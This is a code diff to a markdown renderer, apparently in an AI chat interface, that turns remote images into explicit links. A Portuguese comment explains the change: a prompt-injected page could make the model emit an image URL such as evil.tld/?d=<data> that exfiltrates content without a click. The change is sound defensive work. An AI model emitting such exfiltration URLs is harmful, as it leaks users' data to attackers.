@@ -66,13 +66,15 @@ markdown.renderer.rules.link_close = (tokens, index, options, _env, self) => {
   return self.renderToken(tokens, index, options);
 };
 
-const defaultImage = markdown.renderer.rules.image;
-markdown.renderer.rules.image = (tokens, index, options, env, self) => {
+// Imagens remotas NUNCA viram <img>: o navegador faria o GET sozinho, e uma página com prompt
+// injection pode induzir o modelo a emitir ![x](https://evil.tld/?d=<dados>) para exfiltrar
+// conteúdo sem nenhum clique. Vira link explícito (o usuário decide abrir).
+markdown.renderer.rules.image = (tokens, index) => {
   const token = tokens[index];
   const src = normalizeSafeUrl(String(token.attrGet('src') || ''), false);
-  if (!src) return escapeHtml(String(token.content || token.attrGet('alt') || ''));
-  token.attrSet('src', src);
-  return defaultImage ? defaultImage(tokens, index, options, env, self) : self.renderToken(tokens, index, options);
+  const label = String(token.content || token.attrGet('alt') || '');
+  if (!src) return escapeHtml(label);
+  return `<a href="${escapeHtml(src)}" target="_blank" rel="noopener noreferrer">${escapeHtml(label || src)}</a>`;
 };
 
 markdown.renderer.rules.table_open = () => '<div class="markdown-table-scroll"><table>\n';
